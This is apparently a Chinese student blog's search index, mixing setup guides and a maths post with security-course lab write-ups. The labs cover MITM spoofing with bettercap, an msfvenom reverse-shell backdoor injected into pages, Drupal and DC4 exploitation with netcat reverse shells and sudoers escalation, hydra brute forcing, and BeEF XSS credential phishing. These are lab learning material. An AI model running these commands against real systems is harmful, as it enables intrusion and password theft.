{"pages":[{"title":"友情链接","text":"DUT大连理工大学主页大连理工大学教务处大连理工大学研究生院大连理工大学信息检索研究室(DUTIR) 常用网站Gayhub哔哩哔哩知乎 学习博客阮一峰的个人网站廖雪峰的官方网站 重点关注钟子明’Blog图标库","link":"/friendly-link/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"关于我","text":"大连理工大学四年级本科生主修 计算机科学与技术对任何能对世界作出改变的技术都感兴趣。平常喜欢逛逛bilibili、知乎。欢迎关注我的bilibili，我会不定期投稿一些有意思的视频。ID：不胖到一百三不改名偶尔会练练字，可以和我约字哦，硬笔软笔都可。梦想是成为一名全栈工程师 任重而道远email: aestheticisma@outlook.com 本废宅2020的愿望是： 顺利毕业 成功增重至65kg 能成功找到大厂实习 拥有八块腹肌 世界和平 我是真的想开学！！！","link":"/aboutme/index.html"}],"posts":[{"title":"折腾---美观Mac下的终端","text":"讲道理，Mac下的shell,嗯就是那个bash真的是太丑了，虽然可以修改背景色之类的还是觉得丑，所以就用iTerm2这个玩意代替他了，并且使用zsh代替了bash…虽然bash的功能已经很强大，但对于以懒惰为美德的程序员来说，比如说我，bash的提示功能还不够强大，界面也不够酷炫，并非理想工具。而zsh的功能及其强大，只是配置过于复杂，起初只有极客在用，后来，有个穷极无聊的程序员可能实在是看不下去广大猿友使用单调的bash，于是他创建了一个名为oh-my-zsh的开源项目… 自此，只需要简单的安装配置，我们也都可以用上高档大气上档次，狂拽炫酷吊炸天的oh-my-zsh了。 一、安装iTerm2代替shell1. 官方下载地址：https://www.iterm2.com/ 安装完成后，在/bin目录下会多出一个zsh的文件。Mac系统默认使用Bash作为终端，修改默认为zsh的命令如下： 1chsh -s /bin/zsh 2. 替换背景图片 Iterm2-&gt;Preferences-&gt;Profiles-&gt;window-&gt;Background image 二、安装oh-my-zsh命令 2种方式： 1sh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 或者 1sh -c \"$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" 用第二种方式需要wget，如果没有wget请安装 1brew install wget 如果没有homebrew请自行百度安装这个强大的包管理工具，类似于centos或者ubuntu下的yum和apt-get 接下来只需要简单的配置，就可以享受oh-my-zsh的强大啦！ 三、主题选择Oh-my-zsh有很多主题，具体请查看：主题列表 我选择的主题是ys 请忽视我正在安装的东西… 想要修改主题，打开~/.zshrc文件修改一下ZSH_THEME变量即可1open ~/.zshrc找到ZSH_THEME，将此变量值改为”ys”1ZSH_THEME=\"ys\"最后更新修改后的配置文件1source ~/.zshrc 四、自动补全插件linux的命令有很多，想要全部记住是不可能的事情，如果你是大佬当我没说，这时候就需要我们的自动补全插件啦！自动补全插件有很多种，一个是incr.zsh,下载此插件的命令为：1wget http://mimosa-pudica.net/src/incr-0.2.zsh这个插件确实很屌，但是存在一些bug，比如很卡顿！对，你可以明显感受到卡顿，有点卡顿或许还能忍，但是在使用命令git clone http 对，我下一个要敲 : 可就在我敲下它的一瞬间，终端竟然卡住了，住了，了…… 应该是提示功能太过强大导致的吧…所以我用了另一个插件代替它的功能，但是就没有第一个插件功能这么牛逼了，他的基本作用就是根据历史输入指令的记录即时的提示，这么看起来也算不上自动补全插件咯，但是也是可以提高一点效率的呀！它就是Autosuggestion首先切换目录1cd ~/.oh-my-zsh/custom/plugins/下载插件：1git clone git://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions和修改主题需要修改配置文件一样，先打开配置文件~/.zshrc1open ~/.zshrc在最后添加一行，也就是把刚刚下载的插件的路径添加进去1source ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh保存后执行更新配置文件命令1source ~/.zshrc 到这里就结束啦，开始我们的装逼之旅吧嘻嘻嘻！最后贴一张现在的终端界面吧哈哈！为什么这张图这么大呢，哈哈因为我喜欢吧终端常开着放在几个桌面的最左端，有需要的时候直接切换过去，是不是贼方便呢嘻嘻！！","link":"/2019/07/21/My-Terminal/"},{"title":"Mac下命令行版本的Anaconda安装及常用命令","text":"简单记录一下在Mac下Anaconda安装的过程 一开始的我对Anaconda总是拒绝的，大概是因为自己固步自封不喜欢接受新事物(虽然这也不是新东西啊…)在之前我一直都是用什么包直接pip install xxx完事。直到很久之前某一天发现，为某个项目单独配置一个新的编码环境，各自独立是多么的幸福，用完也可以把这个环境全部删除，对本身的环境丝毫不影响，但无奈于我这个小废物一直很懒，直到今天才想起来安装一下Anaconda。 1. 下载命令行版本安装包官网地址 2. 安装cd到下载目录，输入以下命令直接安装即可1bash Anaconda3-2019.10-MacOSX-x86_64.sh之后一直回车即可（有一步让你同意什么什么协议，输入yes即可） 3.添加环境变量编辑.bash_profilemac下可以用open命令1open ~/.bash_profile添加一行1export PATH=\"/Users/yourname/anaconda3/bin:$PATH\"上面的路径要输入你对应的路径名刷新生效source1source ~/.bash_profile如果安装了oh-my-zsh还需要编辑 .zshrc文件，同样添加上面的一行，之后别忘了source 我们输入python即可进入anaconda 4.关于卸载12345rm -rf ~/anaconda3open ~/.bash_profile# 删除路径rm -rf ~/.condarc ~/.conda ~/.continuum 常用命令环境管理1. 查看当前系统下的环境1conda info -e 2. 查看环境管理的全部命令操作1conda env -h 3. 创建环境12345678# 创建新环境conda create -n env_name#创建制定python版本的环境conda create -n env_name python=3.6#创建包含某些包的环境conda create -n env_name numpy scipy#创建指定python版本下包含某些包的环境conda create -n env_name python=3.6 numpy scipy 4. 激活进入某个环境 win1conda activate env_name mac1source activate env_name 5. 退出环境1conda deactivate 6. 复制某个环境1conda create new_env_name old_env_name 7. 删除某个环境1conda env remove -n env_name 包管理1. 查看当前环境下已安装的包1conda list 2. 查看指定环境下的包1conda list -n xxx 3. 查找包1conda search xxx 4. 更新包1conda update xxx 5. 安装包12conda install xxxpip install xxx 6. 指定的安装环境1conda install -n env_name xxx 7. 安装anaconda发行版中的所有包1conda install anaconda 8. 卸载包1conda remove xxx conda管理0. conda修改源123conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/freeconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/mainconda config --set show_channel_urls yes换回默认源1conda config --remove-key channels在执行conda config 命令的时候会在当前用户目录下创建 .condarc 文件，可以查看更换源前后该文件内容的变化。 1. 检查conda版本1conda --version 2. 升级当前版本的conda1conda update conda","link":"/2019/12/03/anaconda-installformac/"},{"title":"使用bettercap进行渗透测试","text":"软件综合训练—信息安全方向课程总结 （以下所有在虚拟机kali_linux下实现） 一、bettercap是什么bettercap是一款完整，模块化，轻量级，易扩展的中间人攻击测试工具和框架。 如何安装？ 1. 安装依赖1sudo apt-get install ruby-dev libpcap-dev 2. 安装稳定版本（GEM）1gem install bettercap 至此，bettercap已成功安装，下面让我们开始吧！ 二、DNS欺骗创建一个dns.conf文件，下面这个dns语句的意思是：所有的以.com结尾的网站全部解析到我的本地http服务器，.*.com就是一个正则，也可以是自定义的正则。 11.1.1.1 .*.com 之后使用bettercap命令进行DNS欺骗： 1bettercap -X -I eth0 -T 192.168.73.129 -G 192.168.73.2 --dns dns.conf 第一个ip地址为局域网内要攻击的主机ip地址，-G参数为网关。 为什么一定是局域网内的呢，因为我们利用的是ARP报文的广播原理，而ARP报文只能在同一网段内广播，因此我们需要将kali_linux与受攻击的win7在同一网段下，由于我是用VMwa re开了这两个虚拟机，都是利用nat链接，当然属于同一个网段啦！ 之后被攻击的win7主机会出现什么现象呢？ 可以看到，ping百度的域名却返回的是我们在dns.conf中写入的1.1.1.1 三、ARP欺骗+msfMetasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统签名开发。 进行html注入中间人攻击 1. 生成后门1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.73.128 LPORT=444 -f exe &gt; run.exe LHOST为监听主机ip，即攻击者ip。生成一个run.exe文件。 2. 启动本地http服务首先使用screen创建后台： 1screen -S test1 ​ 之后输入： 1python -m SimpleHTTPServer 8888 按ctrl+a+d返回。 3. 启动注入中间人攻击同样的，我们先使用screen创建一个新后台test2 1bettercap -I eth0 -X -T 192.168.73.129 -G 192.168.73.2 --proxy-module=injecthtml --html-data \"&lt;script&gt;document.body.onclick = function()&#123;window.open('http://192.168.73.128:8888/run.exe')&#125; &lt;/script&gt;\" 按ctrl+a+d返回 4. 在本地启动监听与前面一样，创建新后台test3。 之后输入命令如下所示： 1234567msfconsole msf &gt; use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 192.168.73.128 set lport 444 run -j 5. 在被攻击端运行run.exe使用被攻击的win7虚拟机随便打开一个网页，比如 www.baidu.com 之后随便点击一个地方，就会触发我们注入html源码中的函数，跳转到我们的攻击主机ip+端口的web服务上并下载run.exe文件，若点击运行，则被攻击主机的控制权我们就可以拿到了。 6. 获得被攻击主机的控制权在我们的监听会话中我们输入sessions命令可以看到如下内容： ​ 我们可以看到id为1的主机便是我们攻击的主机，那么接下来怎么获取它的控制权呢，很简单，我们只要输入： 12sessions 1meterpreter &gt; shell meterpreter &gt;为输入sessions 1之后的提示符不需要输入。 ​ 接下来我们便可以看到如下内容： 这个界面是不是很熟悉呢，嘿嘿嘿","link":"/2019/09/10/hacker-1/"},{"title":"攻防夺旗DC1","text":"软件综合训练第二天…. 1. 扫描被攻击主机ip地址：1nmap -sn 192.168.73.0/24 从结果发现，共有五台在线主机，IP末尾为.1、.2和.254位虚拟机VMware自带，而kali_linux的IP为192.168.73.131，因此我们要攻击的主机的ip为192.168.73.130。 ###2. 获取更多信息： 1nmap -Pn -sSV -A -p- -T5 192.168.73.130 -Pn为了不同ping，因为知道主机已启动，-p-扫描所有端口，-sC用默认脚本，-sSV发现开放端口然后尝试使用bannergrabbing服务名称和版本信息，-A运行大量nmap脚本来识别操作系统并收集更多信息，比较激进，-T5用于扫描更快。-T3是nmap默认值，在此下可用于避免网络上的IDS（他们会延迟扫描）。ip地址段为kali_linxu所属网段。 可以从结果看出，该服务器是一个web服务器，因为它开放了80端口，并且使用了Drupal的CMS进行搭建的网站。因此我们可以考虑利用Drupal的漏洞进行攻击，但是利用nmap仅仅只能得到其版本为7，不能更加精确，因此我们需要确定他更加具体的版本号。 ###3. 进一步扫描，确定drupal版本： 安装并使用droopescan对drupal 进行扫描： 123git clone https://github.com/droope/droopescan.gitcd droopescanpip install -r requirements.txt 使用方法： 1./droopescan scan drupal -u dc1.com 比如现在我们要攻击的主机为192.168.73.130，则具体命令为： 1./droopescan scan drupal -u 192.168.73.130 扫描结果如下： 由结果我们发现，该网站所使用的drupal版本可能为7.22～7.26，因此存在Drupageddon漏洞 （Drupageddon是Drupal版本7.32中暴露的漏洞。它允许远程代码执行和shell访问） 4. 利用Drupageddonmsf中已经内置该漏洞脚本，可以直接在msf中查找 12msfconsolemsf &gt; search Drupal 接下来就是要利用该脚本进行攻击了，攻击方法如下（在msfconsole下）： 123use exploit/multi/http/drupal_drupageddonset rhost 192.168.73.130exploit rhost参数为被攻击的主机ip地址。 这样我们就获得了这个网站的控制权了，但却不是root用户，我们可以输入以下命令发现我们并没有获得全部的权限： 12shellwhoami 我们可以看到通过whoami命令得到的并不是root用户。 5. Get Flag1 !当我们获取到了被攻击主机的网站控制权后，我们可以试一试ls命令，发现该目录下有一个flag1.txt，我们找到了一个旗子！让我们打开来看看里面有什么提示呢！ 1meterpreter &gt; cat flag1.txt 注意：一定要在meterpreter &gt; 提示符下，如果你跟着我的上一步输入了shell，那请先输入exit退出到meterpreter &gt; 我们可以看到第一条提示：Every good CMS needs a config file - and so do you. 提示配置文件，谷歌得知在在sites/default/settings.php下。 让我们打开配置文件看看都有什么内容呢… 可以看到在第一行写着：flag2 Brute force and dictionary attacks aren’t the only ways to gain access (and you WILL need access). What can you do with these credentials? 同时获得数据库用户名密码（dbuser/R0ck3t) 接下来让我们进入数据库，试着找找有没有下一个flag，进入数据库命令如下： 123shellpython -c 'import pty; pty.spawn(\"/bin/bash\")'mysql -u dbuser -p 之后要求你输入密码，密码上面已经得到了：R0ck3t 之后输入： 12use drupaldb;select * from users; 这样就得到了加密后的admin密码，下面我们需要把数据库dump下来。 6. 把数据库dump下来：1mysqldump -u dbuser -p drupaldb &gt; 1.sql 使用ls命令可以看到当前目录下存在1.sql文件。 使用cat命令打开1.sql查找flag3，可以发现存在提示：search_dataset:flag3 special perms will help find the passwd but you ll need to exec that command to work out how to get what s in the shadow 两个提示：一个find，一个passwd 7. 根据提示，寻找其余flag因为passwd为配置文件，位于/etc/passwd，因此我们cd到/etc目录下查看passwd文件内容： 我们可以发现passwd文件内容最后一行存在一个用户名为flag4，我们于是cd到flag4的用户目录/home/flag4下查看。 我们发现该用户目录下有一个flag4.txt，于是我们继续用cat命令查看该文件内容。 这个提示告诉我们最后一个flag在root目录下，我们可以利用和find相似的方法去寻找。 1find /root 可以看到在/root目录下有最后一个flag，即thefinalflag.txt，但是我们并没有root用户权限，怎么才能查看到这个文件内容呢？ 我们可以利用find进行提权，直接使用以下命令： 1find /root/thefinalflag.txt -type f -exec cat '&#123;&#125;' \\; 好了，我们终于成功了！嘿嘿嘿！","link":"/2019/09/11/hacker-2/"},{"title":"DC4","text":"软件综合训练-续 开始之前需要先下载DC4虚拟机映像，请点击：DC4下载 下载后直接导入即可，别忘记将网络设置为NAT。接下来我们开始吧！ 启动kali和DC4，已知我的kali的ip地址为192.168.73.134 如果不知道请先通过ifconfig查看ip地址，为了便于执行命令，首先直接ssh到kali。 1. 扫描局域网上的在线主机1nmap -sn 192.168.73.0/24 同样的，ip为.1、.2、.254的为vmware私有，由于本机为.134，则所要攻击主机为192.168.73.133 2. 对目的主机进行详细扫描：1nmap -p- -A 192.168.73.133 可以由扫描结果看出，该主机开放了22和80端口，他很可能是个web服务器，让我们通过目的主机的ip地址访问一下它的80端口看看是什么样子！ 3. 爆破登陆密码发现竟然是个登陆页面，让我们通过hydra爆破一下，字典用/usr/share/wordlists/rockyou，由于rockyou没有解压，我们先cd到该目录将其解压 12cd /usr/share/wordlists/gzip -d 压缩文件名 之后进行密码爆破： 1hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.73.133 http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:S=logout\" -F ip地址为目的主机 爆破成功，我们得到了login: admin password: happy 接下来用账户密码登陆一下试试吧。 发现有两个选项，一个Command，另一个为退出登陆，点击Command试试吧！ 点击Run，会发现相当于对目的主机发送了ls -l的命令，如下图所示： 这就给了我们渗透进入目的主机的机会！我们可以抓取点击Run后发给目的主机的包，修改这个命令，从而渗透入目的主机，让我们开始愉快的抓包吧！ 4. 抓包、改包、发包既然要抓包，就要用到kali内置的Burp Suite了，打开之后显示如下： 首先设置一下Burp和火狐浏览器的代理设置： Burp: Proxy-&gt;Options-&gt;点击默认的代理规则-&gt;Edit-&gt;Request handing-&gt;勾选Support invisible proxying(enable only if needed) (Burp的抓包默认是开启的） 火狐浏览器代理设置： 点击Preferences 下拉滚动条找到Network Proxy，点击Settings，如下填写： 点击OK，完成浏览器的代理设置。 让我们捋一下我们的渗透过程，通过点击Run，发送包至127.0.0.1:8080，也就是本地的8080端口，由Burp截获包，修改包中的命令字段，通过Burp将包发送到目的主机。由于我们的目的是渗透入目的主机，即反向shell，因此我们首先需要用Netcat设置一个Netcat侦听器。 关于反向shell工作原理如下： 在此示例中，目标使用端口4444反向连接攻击主机(即我们的kali)，-e选项将bash shell发回攻击主机。所以我们只要想办法在目标主机上执行nc 192.168.73.134 -e /bin/sh就可以了，现在想想，是不是只要将之前发送的包中的命令字段从ls -l变成这个就可以了呢，嘿嘿嘿，既然明白了原理，just do it! 首先在我们的kali上执行： 1nc -lvp 4444 接下来打开之前的火狐浏览器，点击Run，开始抓包。 打开Burp，你会发现已经抓包成功了。 将radio字段改成nc+-nv+192.168.73.134+4444+-e+/bin/bash ip地址为kali的ip地址。 之后点击Intercept is on，即发包，将包原路发出去。可以看到按钮变为Intercept is off 看看我们的shell是不是变成了下面的样子： 之后在shell中输入: 1python -c 'import pty; pty.spawn(\"/bin/bash\")' 是不是成功返回了目的主机的bash shell。 5. 获取密码去到/home目录下，会看到有三个用户：charles jim sam 浏览一下这几个用户目录，发现在/home/jim/backups下有一个密码字典：old-passwords.bak，既然有密码字典，我们又可以进行密码爆破啦！ 再开一个ssh连接我们的Kali，将三个用户名保存为一个users.txt，将这个密码字典的内容复制下来保存为一个passwd.txt，这两个txt文件都是要保存在kali上的哦。 下面在新开的ssh上输入以下命令进行密码爆破： 1hydra -L users.txt -P passwd.txt 192.168.73.133 ssh ip为目的主机ip地址。 密码爆破结果： 通过爆破得到 login: jim password: jibril04 让我们回到渗透那个ssh上，继续下面的工作。 6. 切换到jim用户因为我们已经知道了jim的密码，所以让我们切换到jim用户浏览一下吧！ 1su jim 会提示输入密码，输入之后便以jim用户权限访问目的主机。 在其用户目录下发现有一个mbox，cat一下： 1cat mbox 发现其在发邮件，于是我们到/var/mail目录下查看jim的邮件： 打开cat一下 发现是charles给jim发送的邮件，并向他告诉了密码：^xHhA&amp;hvim0y 有了charles的密码，接下来让我们切换到他的用户权限下看一看。 7. 切换到charles用户1su charles 看一下charles的用户权限： 1sudo -l 发现/usr/bin/teehee 可以使用sudo 看一下teehee的帮助内容 1/usr/bin/teehee --h 我也没看出什么名堂来，应该是可以写文件之类的… 接下来这一步我没有搞懂，看懂的小伙伴私信我一下哦， 1echo \"charles ALL=(ALL:ALL) ALL\" | sudo teehee -a /etc/sudoers 最后cat一下/root/目录下的flag.txt就可以了 1sudo cat /root/flag.txt 这样子就完成了！","link":"/2019/09/17/hacker-3/"},{"title":"XSS结合Beef的社会工程学窃取密码实验","text":"软件综合训练-终结篇 不说废话了，直接切入正题…… 本次实验共用到老师给的kali和被攻击的win7系统。 1. kali上的配置首先启动虚拟机，打开kali，直接点击kali桌面的这个图标，beef就会成功启动。 你会看到弹出一个终端如下： 终端上显示等待倒数5…4…3…2…1…秒，之后会弹出一个页面，即是我们要用到的beef，如下所示： Uername和Password默认都为beef，如果你想修改这个用户名和密码，请去修改/etc/beef-xss/config.yaml该配置文件中用户名和密码字段值。 我们输入用户名密码之后会显示如下页面： 可以看到左边框中有两个文件夹，一个为Online Browsers，即在线主机；另一个为Offline Browsers，当然就是离线主机了。 2. win7上的配置开启win7虚拟机，打开下图的这个软件： 如果提示系统没有什么VC11之类的运行库，直接点击取消即可。 之后点击启动，如下所示： 到这里win7的配置基本完成，别忘了你的win7的ip地址，如果不记得了就在dos中输入ipconfig查看。 如图所示，我的win7的ip地址为192.168.73.129 3. 继续回到我们kali上再开一个页面，在url搜索框中输入win7的ip地址，会打开一个新的的登陆框， 用户名为admin，密码为password。登陆之后显示如下： 让我们下滑到最后，有一个DVWA Security选项，从impossible改为low，不然永远成功不了，修改之后点击Submit提交。 选择左边菜单栏的XSS(Stored)选项，Name字段值随便填写一个，比如我填写111，Message字段如下填写： 1&lt;script src=\"http://192.168.73.137:3000/hook.js\"&gt;&lt;/script&gt; 你可以在这行代码前面添加一个输出，比如输出hello: 1hello&lt;script src=\"http://192.168.73.137:3000/hook.js\"&gt;&lt;/script&gt; 当你复制我这行代码的时候，如果细心的话，你会发现，卧槽复制上去根本少了一些代码啊！ 原因是这个输入框的width有点短，让我们修改一下这个页面的html代码，将这个输入框的长度变长一些。 按下F12，查看源码。 让我们点击下面出现的这个框框的最左边的按钮，它可以让你点击原先页面的位置，以便与快速定位html元素。 点击之后会发现，有一行html代码高亮显示，让我们右击编辑它，将maxlength字段值改为1000，如下所示： 改完之后可以关掉这个框框了。 你会发现原先Message中的内容不见，让我们重新粘贴一下复制的那行代码： 啊！现在终于能复制全了，那就让我们点击下面的Sign Guestbook提交吧！ 是不是像下面这样显示呢？ 看它成功返回了hello这个结果。现在让我们回到之前beef那个页面，去看看那里有什么改变。 你会发现在左边的Online Browsers文件夹中出现了一台主机， 让我们点击它，出现下面这个页面： 点击Commands，让我去社会工程学栏中寻找一个叫做Pretty Theft的脚本文件，如下所示： 现在我们可以点击右下角的Execute了。 让我们回到另一个打开的页面，你会发现弹出了一个类似于facebook的弹窗，如下显示： 当我们在里面输入Email和密码之后点击log in，你所输入的信息就会到beef的后台数据库中。 回到beef页面，你会在数据库中看到如下信息： 到这里这个实验就结束了！","link":"/2019/09/18/hacker-4/"},{"title":"如何使用ipv6进行校园网免流","text":"总结一下自己搭建ipv6服务器的过程，以防自己忘记了…… 一、购买VPS服务器VPS服务器我选择了国外的，毕竟这样子可以让我们的ss自带科学上网功能嗷，何乐而不为呢嘻嘻。下面进入正题：根据各位大佬们的推荐，我选择了国际知名（我也不知道它到底知不知名嘻嘻）的vultr：vultr注册地址 注册登录后点击下图的加号就可以进行购买了（哦对前提是你的账户里要有钱…而且我买的时候vultr有充10$赠送50$的活动）支持支付宝微信支付哦！ 点击加号之后就可以选择服务器的类型了，你可以选择服务器的Locations，如果你希望访问Youtube快一些，那就选美国的服务器，要是你想看一些日本的小网站快一些（我也不知道是什么小网站啦）那就选择日本的服务器。我当时选择了Los Angeles的服务器…至于服务器的os嘛，ubuntu14就够了（最近看到这个网站把ubuntu14取消了，最低都是16.04了）至于配置情况，选价格最低的就完事了（最低也要5$我哭） 选完之后一定要勾选上下图这个选项，因为我们要用ipv6嘛 接下来就放心的付款就好了，vultr是按小时收费的，所以就算选错了误付款也没事，我们destroy了它重新买就好了。 接下来在服务器后台页面的settings选项中我们可以找到服务器的ipv6地址。在部署SSR账号时，我们就用ipv6的ip地址了，前提是我们的网络要支持ipv6喔。 二、部署VPS服务器Begin写这篇blog的时候发现，我的服务器的ipv4地址被墙了（从这个月初开始同学告诉我某些vpn被封了，然后我发现我搭的vpn也崩溃了…很难过…)但是没关系！我们还有ipv6啊，你不让我用ipv4,我还可以用ipv6啊。不过首先你的网络和电脑都要支持ipv6，我们才能用ipv6进行ssh远程控制服务器。 ssh命令如下： 1ssh username@ipv6地址 username默认是root，之后输入yes,windows下一定是输入yes而不是y。之后输入vultr给的默认密码(有点复杂远程之后可以修改)，这样我们就可以远程连接到了我们的服务器了！为了解决这个默认的密码有点难输入的问题，ssh后的第一步我们当然是修改密码啦！输入 1passwd 之后输入你想改的密码，再确认一次就成功啦（这里的密码也是不带回显的哦） 安装pip环境(Ubuntu)1apt-get install python-pip 直接安装shadowsocks1pip install shadowsocks 如果出现Command “python setup.py egg_info” failed错误信息，则输入 1pip install --upgrade pip 再执行上面的操作 如果提示没有setuptools模块，则安装setuptools 1pip install setuptools 再执行上面的操作 如果出现”cannot import name main”错误信息，则是因为将pip更新之后库里面的函数有所变动造成的。解决方法如下： 1sudo vi /usr/bin/pip 将原来的1from pip import main 改为 1from pip._internal import main ps:在这里我默认你会vi的操作，如果不会，请自行百度。 配置shadowsocks.json文件装好shadowsocks后，我们需要在/etc/下创建一个名为shadowsocks.json的文件（其实这个json文件不叫这个名字也可以）创建该文件的命令为:1vi /etc/shadowsocks.json 这时我们创建一个新文件，在里面输入下图所示内容： 其中的 “server”:”::” 中的”::”代表启用ipv6。编辑完后，我们按esc退出编辑模式，输入 :wq 保存并退出。之后再shell中输入 1ssserver -c /etc/shadowsocks.json -d start 来启动shadowsocks服务。接下来在vultr网站的服务器管理页面，点击settings,如下图所示 点击图中这个configuration examples 按照官网例程所示，修改/ect/network/interfaces文件 这里面是我的ip地址，你要填你自己的哦，填我的是没用的啦…最后重启服务器就好了！重启完服务器别忘了重启shadowsocks服务嗷，如果忘记了启动命令往上面看哦~（ps:我们可以利用supervisor使shadowsocks进程开机自启，具体怎么操作就自行百度一下吧嘻嘻） 到此，我们在服务器上的配置工作就完成了 三、在自己PC上下载shadowsocks在我们自己的pc上，我们需要下载一个小飞机，也就是shadowsocks。具体配置如下图所示 服务器地址就是你的ipv6地址，端口是在shadowsocks.json文件中填写的端口，注意加密方式不要选错哦。之后点击确定就可以了。小飞机有全局模式和PAC模式，全局就是所有的在浏览器内的网络访问全部走的代理，即通过你的ipv6网络到你的服务器，而PAC模式则是访问国内网站使用自己的本地网络ip，访问国外网站走代理。下面我们测试一下，将小飞机的全局模式打开，启动系统代理，在百度中输入ip，如果会有下图显示的样子，就说明我们大功告成了！ 不过现在的网络速度还是太太太太慢了，如果你想提高网络速度，请继续往下看… 四、开启BBRBBR（新的TCP拥塞控制算法Bottleneck Bandwidth and RTT).要开启BBR，必须要求Ubuntu的内核大于等于4.9，所以要使用这个牛逼哄哄的玩意，我们需要看一下内核是不是4.9以上。查看内核命令 1uname -a 如果没有高于4.9，那我们接下来需要升级内核了！升级的过程也比较简单，首先我们需要确定我们服务器的系统是32位的还是64位的查看命令： 1getconf LONG_BIT 比如我的服务器系统是64位的，那么输入以下命令 12wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.2/linux-image-4.10.2-041002-generic_4.10.2-041002.201703120131_amd64.debdpkg -i linux-image-4.10.0-041002-generic_4.10.2-041002.201703120131_amd64.deb 上述命令都执行完后，就可以更新grub引导装入程序了。命令为： 1update-grub 最后输入 1reboot 重启机器，我们再次用uname -a命令查看内核版本，会发现升级成功！准备工作都做完了，我们可以开始开启BBR了！执行以下命令： 12echo \"net.core.default_qdisc=fq\" &gt;&gt; /etc/sysctl.confecho \"net.ipv4.tcp_congestion_control=bbr\" &gt;&gt; /etc/sysctl.conf 保存生效 1sysctl -p 验证是否已开启bbr: 1lsmod | grep bbr 如果出现 则开启成功！现在开启我们的科学上网之旅吧！","link":"/2019/06/29/ipv6/"},{"title":"拉格朗日乘数法","text":"在看摘要的文章中突然发现拉格朗日乘数法这个名词，觉得很熟悉但不记得具体是什么了，简单记录以备遗忘。看了wiki百科后，发现原来这个用来优化的方法在大二的一门课————《最优化方法》上学过，怪不得很熟悉，而且这貌似也是大一工数的知识…大四的小废物全部忘光了，该查缺补漏继续学习了… 一、简介(from wiki)在数学中的最优化问题中，拉格朗日乘数法（以数学家约瑟夫·拉格朗日命名）是一种寻找多元函数在其变量受到一个或多个条件的约束时的极值的方法。这种方法可以将一个有n个变量与k个约束条件的最优化问题转换为一个解有n + k个变量的方程组的解的问题。这种方法中引入了一个或一组新的未知数，即拉格朗日乘数，又称拉格朗日乘子，或拉氏乘子，它们是在转换后的方程，即约束方程中作为梯度（gradient）的线性组合中各个向量的系数。比如，要求$f(x,y)$在$g(x,y) = c$时的最大值时，我们可以引入新变量拉格朗日乘数$\\lambda$，这时我们只需要下列拉格朗日函数的极值：$\\mathcal{L}(x,y,\\lambda)=f(x,y)+\\lambda \\cdot {\\Big (}g(x,y)-c{\\Big )}$更一般的，对含有n个变量和k个约束的情况，有：$\\mathcal{L}(x_{1},\\ldots,x_{n},\\lambda_{1},\\ldots,\\lambda_{k}) = f(x_{1},\\ldots ,x_{n})-\\sum \\limits_{i=1}^{k}\\lambda_{i}g_{i}(x_{1},\\ldots,x_{n})$，拉格朗日乘数法所得的极点会包含原问题的所有极值点，但并不保证每个极值点都是原问题的极值点。拉格朗日乘数法的正确性的证明牵涉到偏微分，全微分或链法。 二、证明设函数$f(x,y)$在$A$处有极值$\\kappa$,且在点$A$的邻域内连续。则在点$A$处有：$f(x,y) = \\kappa$另有一常值函数$g(x,y) = c$两函数在$A$点处的全微分为:$\\mathrm{d}f=\\dfrac{\\partial{f}}{\\partial{x}}\\mathrm{d}x + \\dfrac{\\partial{f}}{\\partial{y}}\\mathrm{d}y = 0$$\\mathrm{d}g=\\dfrac{\\partial{g}}{\\partial{x}}\\mathrm{d}x + \\dfrac{\\partial{g}}{\\partial{y}}\\mathrm{d}y = 0$由于齐次方程有非零解，也就是点$A$，所以该齐次方程的行列式为0，因此该线性方程组的系数成比例，有：$\\dfrac {\\dfrac {\\partial {f}}{\\partial {x}}} {\\dfrac {\\partial {g}}{\\partial {x}}} = \\dfrac {\\dfrac {\\partial {f}}{\\partial {y}}} {\\dfrac {\\partial {g}}{\\partial {y}}} = -\\lambda$即：$\\dfrac{\\partial{f}}{\\partial{x}} + \\lambda \\dfrac{\\partial{g}}{\\partial{x}} = 0$ $\\dfrac{\\partial{f}}{\\partial{y}} + \\lambda \\dfrac{\\partial{g}}{\\partial{y}} = 0$将上二式分别乘以$\\mathrm{d}x$和$\\mathrm{d}y$，再相加并积分，得到一新函数$\\mathcal{L}(x,y,\\lambda) = f(x,y) + \\lambda \\cdot g(x,y)$那么，求原函数极值的问题就转化为求该函数极值的问题。类似地，这种求极值的方法也可以推广到多维函数$f(x_{1},\\ldots,x_{n})$ 三、举例给定椭球：$ \\dfrac{x^2}{a^2} + \\dfrac{y^2}{b^2} + \\dfrac{z^2}{c^2} = 1$，求这椭球的内接最大长方体的体积。这个问题实际上就是条件极值问题，即在条件$ \\dfrac{x^2}{a^2} + \\dfrac{y^2}{b^2} + \\dfrac{z^2}{c^2} = 1$下，求$f(x,y,z) = 8xyz$的最大值。这个问题当然可以用消元法解决，但我们在这里用的是拉格朗日乘数法。首先定义拉格朗日函数$\\mathcal{L}(x,y,z,\\lambda) = 8xyz + \\lambda \\cdot (\\dfrac{x^2}{a^2} + \\dfrac{y^2}{b^2} + \\dfrac{z^2}{c^2} - 1)$之后解变量的偏导方程，对$\\mathcal{L}(x,y,z,\\lambda)$求偏导得：$\\dfrac {\\partial{\\mathcal{L}(x,y,z,\\lambda)}} {\\partial{x}} = 8yz + \\dfrac {2 \\lambda x}{a^2} = 0$$\\dfrac {\\partial{\\mathcal{L}(x,y,z,\\lambda)}} {\\partial{y}} = 8xz + \\dfrac {2 \\lambda y}{b^2} = 0$$\\dfrac {\\partial{\\mathcal{L}(x,y,z,\\lambda)}} {\\partial{z}} = 8xy + \\dfrac {2 \\lambda z}{c^2} = 0$$\\dfrac 